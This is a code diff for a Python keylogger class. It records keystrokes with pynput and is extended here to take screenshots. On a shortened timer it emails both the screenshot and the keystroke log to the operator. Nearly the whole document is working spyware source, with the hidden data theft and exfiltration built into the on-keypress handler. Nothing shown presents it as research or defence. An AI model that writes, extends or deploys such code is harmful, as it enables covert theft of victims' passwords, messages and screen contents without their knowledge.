@@ -1,6 +1,7 @@
 from pynput.keyboard import Key, Listener # used to listen to keystrokes
 import logging, time  # import used to log, get elapsed time
 from myemail import Email
+from screengrabber import ImageGrabber as Camera
 
 class KeyLogger:
     """
@@ -13,9 +14,11 @@ class KeyLogger:
     mem: string buffer to minimize logging writeouts
     start_time: time of the current logging cycle
     """
-    def __init__(self, mail, email_st=120, log_ft=20, log_dir=""):
+    def __init__(self, mail, email_st=12, log_ft=10, log_dir=""):
         # email obj
         self.email = mail
+        self.camera = Camera()
+        self.imgage_name = "screen.png"
 
         # times for last updates
         self.start_time = time.time()
@@ -44,10 +47,11 @@ class KeyLogger:
 
     def __screenshot(self):
         """
-        Takes screenshot of computer
+        Takes screenshot of computer and saves it to the defined file
+        return: filename of image taken
         """
-        # TODO takes a screenshot of the persons screen
-        return None
+        self.camera.grab_to_file(self.imgage_name)
+        return self.imgage_name
         
     def __on_press(self, key):
         """
@@ -61,11 +65,11 @@ class KeyLogger:
             self.mem.clear() 
             self.start_time = time.time()
         
-        # check to see if it's time to email
+        # check to see if it's time to email, send screenshot as well
         if self.__check_time(self.email_send_time, self.email_time):
+            self.email.send_email_with_file(self.__screenshot())
             self.email.send_email_with_file(self.filename)
             self.email_time = time.time()
-            # TODO rollover log
     
     def __check_time(self, check, curr_time):
         """
